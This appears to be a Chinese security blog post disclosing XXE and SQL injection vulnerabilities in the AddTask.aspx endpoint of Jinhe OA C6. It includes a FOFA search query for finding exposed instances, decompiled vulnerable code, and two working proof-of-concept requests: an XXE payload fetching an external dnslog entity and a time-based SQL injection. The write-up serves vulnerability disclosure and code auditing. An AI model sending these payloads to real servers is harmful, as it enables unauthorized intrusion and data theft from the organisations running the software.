---
title: "金和OA AddTask.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-AddTask-sqli-xxe.html
asset_dir: assets/金和oa-addtask.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA AddTask.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/9 12:26
- 1298浏览
- [0评论](#comment)
- 43分钟阅读

深入探索

SQL

软件

server

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AddTask.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，同时该接口还存在[XXE](https://mrxn.net/tag/XXE)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

Web安全书籍

安全

计算机安全

先看下 AddTask.aspx 的实现

```
<%@ Page language="c#" Codebehind="AddTask.aspx.cs" AutoEventWireup="True" Inherits="JHSoft.Web.DailyTaskManage.AddTask" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
    <HEAD>
       <title>AddTask</title>
       <meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
       <meta name="CODE_LANGUAGE" Content="C#">
       <meta name="vs_defaultClientScript" content="JavaScript">
       <meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
    </HEAD>
    <body>
       <form id="Form1" method="post" runat="server">

       </form>
    </body>
</HTML>
```

在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `AddTask` 的处理逻辑

SQL注入检测工具

```
private XmlDocument xmlDocument = new XmlDocument();
public string XmlStr;
protected HtmlForm Form1;

protected void Page_Load(object sender, EventArgs e)
{
  this.xmlDocument.Load(this.Request.InputStream);
  string innerText = this.xmlDocument.SelectSingleNode("//root//Page//PageName").InnerText;
  this.XmlStr = this.xmlDocument.DocumentElement.OuterXml;
  this.Xml(innerText);
}

private void Xml(string strPageName)
{
  string str1 = string.Empty;
  string empty1 = string.Empty;
  string empty2 = string.Empty;
  string empty3 = string.Empty;
  string str2 = strPageName;
  if (str2 != null)
  {
    if (!string.op_Equality(str2, "TaskDetect"))
    {
      if (string.op_Equality(str2, "TaskAdd"))
        ;
    }
    else
      str1 = new DetectCls().DetectResource("Calendar", "1", this.xmlDocument.SelectSingleNode("//root//TaskExecutorID").InnerText, this.xmlDocument.SelectSingleNode("//root//StartTime").InnerText, this.xmlDocument.SelectSingleNode("//root//EndTime").InnerText) ? "0" : "1";
  }
  ((Control) this).Page.Response.Write(str1);
  this.Response.End();
}
```

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE漏洞](https://mrxn.net/tag/XXE)。

再跟进 `DetectCls` 的 `DetectResource` 方法，其实现如下

代码安全审计

```
public bool DetectResource(
  string strModeId,
  string strResourceType,
  string strResourceId,
  string strStartTime,
  string strEndTime)
{
  if (string.op_Equality(strResourceId, ""))
    return false;
  strResourceId = $"'{strResourceId.Replace(",", "','")}'";
  if (((InternalDataCollectionBase) this.op.ExecSQLReDataTable($"select id,starttime,endtime from resourcedetect where modeid='{strModeId}' and resourcetype='{strResourceType}' and resourceid in ({strResourceId}) and ((datediff(minute,'{strStartTime}',starttime)<=0 and datediff(minute,'{strEndTime}',endtime)>=0) or  (datediff(minute,'{strStartTime}',starttime)<=0 and datediff(minute,'{strStartTime}',endtime)>=0 and datediff(minute,'{strEndTime}',endtime)<=0) or  (datediff(minute,'{strStartTime}',starttime)>=0 and datediff(minute,'{strEndTime}',starttime)<=0 and datediff(minute,'{strEndTime}',endtime)>=0) or  (datediff(minute,'{strStartTime}',starttime)>=0 and datediff(minute,'{strEndTime}',endtime)<=0))").Rows).Count > 0 || this.op.IsError)
  {
    this.StrErrorMessage = this.op.ErrorMessage;
    return false;
  }
  return this.RegisterResource(strModeId, strResourceType, strResourceId, strStartTime, strEndTime);
}
```

参数 `strResourceId` 被直接拼接进 `ExecSQLReDataTable` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
Content-Type: application/xml
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.vk8uek6g.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

[![金和OA AddTask.aspx XXE漏洞+SQL注入漏洞](images/img-001-a17b8968ebbd.webp)](https://image.mrxn.net/3c4e418dd4c74201b148398cef7e9368.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.dailytaskmanage/AddTask.aspx/ HTTP/1.1
Content-Type: application/xml
Host: jhsoft.mrxn.net

<root>
  <Page>
    <PageName>TaskDetect</PageName>
  </Page>
  <StartTime>2023-01-01 00:00:00</StartTime>
  <EndTime>2023-01-01 00:00:00</EndTime>
  <TaskExecutorID>3');WAITFOR DELAY'0:0:5'-- </TaskExecutorID>
</root>
```

[![金和OA AddTask.aspx XXE漏洞+SQL注入漏洞](images/img-002-63b32c83d37d.webp)](https://image.mrxn.net/35443d5febba42ceb7909e969b018de6.webp)

成功延时 5 秒钟

数据管理

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL注入](#toc-5-2-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKfUlEQVR4AeycgXbjuA5Dc+f//3m3MAuJkWjHmaaJz656hgUFgLRGjJpm9p3353a7/fPT+Of7y32+lxtU3CYM3+zLOFju9mmt8h9xrst45Jdmr3KHOaP5n6IG8tVj/bnKCbSBfE369ky84y8A3IDyUcCkwcy52H83r/cQoof9Qtjnqj6qeSZyjzaQTK78cycwDQTi1QA1Hm3Vr4rsMQdzv+w7yiFq3esZdF+IHl4LIbjcT/xeQPiB9tNkzyseuh/mXJ4xpoGMhrV+7wmsgbz3vB8+7aUDgf1rmX8sOH+4uycNsP98t4LuqfZhDrrPte/Alw7kHRv+rz/jVwbiV5mwOkDorz6IXF5F5RevgPBCx+yXR5E55+LHsAZ1P+vGXG/u1fgrA7m9epf/o35rIBcb9jSQfC2r/Mz+of8IgMirutwfZp/1qtYcRB1gqn1GUL1JYPpkb61C1TqsQ/SAjtYqdP0eVjXTQCrT4t53Am0g0KcOj/OjLeZXxJGv0nItxD6OfJUGUQdUcuOA7dY8+0z5W5MigegL5zC3aAPJ5Mo/dwJrIJ87+/LJf3T9fhru7D5e76F90K+0ub0a8fYIIWqVO+QZA8I38nkN4YH+j4bQOXuhc+Mzvf4prhvi074IHg4E4hVR7RVCAyYZ2N4sgUnLRH41mQeeqoXuh8jdS+hnKFdAeAAtt7BHCGzPVz7GZj7xDaIHzJjLYdYPB5KLL5D/L7bwB2JK1d/WrxAID9Bs1oSNLBLpikLaXonAhtbldZgzQniho7Wz6N4ZH9VCPC/XQHCuhVhDfx/K/spnLuO6Ifk0LpCvgVxgCHkLbSDQrxxEbmO+ehAa7GP2u0dGiNrsg+Cyb8yz33n2VBxE3yPtUQ/rEL2g/1iC4OwRQnDQUfwY3lPGNpDRvNafOYHpg2HeBvQJQ+TW81SdW8sIUQcd7YfO5Zq9HGa/ewkhdOWOvV57PESPrLtXRuuZO5O7bg/XDdk7mQ/xayAfOvi9x7bPITBfVRflq2gOwg+Yav9hqBE7CXD32UM2P0O5wxyE32shBGfvI4TwQ0fXwGs46H0At98Q2P7O2rsDgoOO64Zsx3Wdb+1NvdqSJ3mkyQN9wnCfS1fkHlqPAfd10Ne5dszh2OfnuM7rjNaE5pU7IJ5hTWjNKG4Ma48w160b8ui03qyvgbz5wB89rr2p52vj3MUQVxYwtb1BARuOfq+FLlDugKiz9gjHOuiflB/VQjzLPbIfQnvEZd05RK37QqwBW+7QvjvyewFs5wjc1g25XeurvalDnxLc53nLnnTGrCuHXq+1AjrnWpg5a0LVKSB8yo9CNYrs0VphDqIX9Fsm3WFfhTDXHvmyBlGbOT8z47oh+YQukK+BXGAIeQttIL42Waw46xBXEDBVIrC9YZViQUL4of9IKWxbT+BOAhoP9/md8XsB9x7gW7mHo3Ow0x6hub/BNpC/KV41uyfw10IbCLC9ujRhx1FXe4T2KVd4nVG8A+JZWYfg7BHCzIlX5Frn4sewZsz6Kzj3gNgrYOoO/VxgO2eg6UDj2kCaupKPnkD7YOhdQJ8WRO7pCivfyMk3hj0ZR4/WlQ6xD+iYfc6h6xC5eiog1tDRdRnlVWQOoiZzzmHWVK+A0ADb7xDYbkYm1w3Jp3GBfA3kAkPIW2if1HXFxshG5xDXLHvhnrNXCKFBR/EK6BxELn6M/Kxnc/eq6qxBPBswtf0oATZsZEogtKovzBrMnGtT2/VvWfkwrpC3N3WICeZNeYIQGtBkYHv1ABPXiJS4V8YktxSY+lqEWYPOwXO59+L+jxB6f9dC5yDyqs9Z/3oPqU7vg9wayAcPv3p0G4ivVDZVuX0VVv5nudwX4kcABD7qlWudjzXmhdaUO2D/WfYIIXzKFe4l1Fqh/NloA3m2cPl/5wRODUTTdngbEK8Q6FhpY508EDXKz4R7ZDyqg+gPNJtrG/GVANsvEF9p+1P5LEL4Yf6XaNcJKz9ErXSHfV4LTw3EhQt//wTWQH7/jJ96QvukXlVBXDOYUdfrTMBc62flenPQ/dahc3Cf2yOE0NxLKF4B+5p8Dgifao7CfiNEHXSs6qHrVe26IT6Vi2D7pO79QJ9gNWFz0H0QedXDnOuE5iDqoL9JSndA6F67Tlhx4hXWhForlCsgegKidwPY3vCB5gEaB/d5M30leo7iK53+iB8jm9YNyadxgfzwPcT7g/5qMDdOWWsIn/IxXCe0ptwBUet1Rpg1CA46ui90Du7z3PdsDtEj+/0sc14LzWWEuQcEpxrHB25I3ubKxxNYAxlP5MPr6U397H4grht0rGqh63Cf+5oKXQvdY076GJUGUWvtJ5if5z6Zg/1nQWjQ0bXulRG6b92QfDIXyKeBeJLCan8Q05Q+hv0QHui/zlrLCLMv98zevRzO9XDf3AeiNnPOITTA1Gn0szIeFWffNJCjwqX9/gmsgfz+GT/1hGkgQPs06k75SpmD2WetwtyjyqH3g8irPubcw2sh7NdBaK7LCKEBajOFvZPwRVQasJ3hl3z4x7UQfmD9r05uF/tqn9QhpuSpCSG4vGfxY1g37/UjhOgPx2/+VR+IWj8zY+U/y7lP5Yd4JvT9QnCV/xEHUetnCqcfWY+aXFX/r+xrDeRik2yf1HVdFHl/WisyB3HNYB+z3znMfvV22Jdx1KD3sAady7Vncoha9xK6TrnDXEa4r81aVQfhzz7nEBqw3tRvF/tqb+reF/RpwZzb51dBRmsVZp9z2O+vHnCvi3NAaO4ltJZRfA6IOqDZgO3XVKixGYsEoiZLEBx0zLpz78tr4XoP0SlcKNZALjQMbaW9qWsxhq9UhTBfR/vGPntr+4V7HvHSxxC/FzDvDYIb+4xr98y8uSOE6A+UNvcDph+P1oTrhpTH9zlyelPXlBxH27JHaB/E9MU5Rg3CA1jaRfcAtlfVrvFbgNkHM/dtL8HPLMWCtL/Cwt7+bxDltw6xR2D92ns7/Hq/2N5DoE8Jnsu9bU1dAb1+1KQ7rD1C+2Hum2vtO0LoPSDy3AOCg47Wc19zRpj91oTQdYhcvCL3Xe8hOpELxRrIhYahrbSB5GtzJlfxMwFxTaFjVZ+fDeE98kF4gGYDtl8CYMbc3zl0n7nWLCXQfYneUtcJN2L4Jl4x0NsSet82kE1Z3z5+AtNAoE8L5vyVO4beX68exdn+ELWVX30clW4O5h4QnOuF9it3mIPww4z2CCF05WO4p3AayGhe6/eewBrIe8/74dNeOhA4dy11NRXV7iB6QP/v1vapxlFxELXWhPYbxTnMVWhPRoj+QKan3P2ycJZ76UDyBla+fwJHyksH4ldBRj8cmH4VzT4I3X4hBAczSldA17TeC+g+iHzPKx7CAx3zfuVRZM65+L2wR2gP9Ge8dCB+wMK/P4E1kL8/u1+pnAaiq3QUz+4C4jpWdRAa9Dfw6tlV7REHva997uv1HkLUZt21EBrQZGD6UQzBuU7YClICs28aSPKv9AMn0AYCMS04h0d7hd5Drw5F9mutyBz0Gojcurx7YY/QHuUOiF4QaI8QgoOO4hWuf4TyKiof9L6VXnFtIJW4uPefwBrI+8/88In/AgAA//9QEha8AAAABklEQVQDAMZtoK2jK+F7AAAAAElFTkSuQmCC)

手机扫码阅读
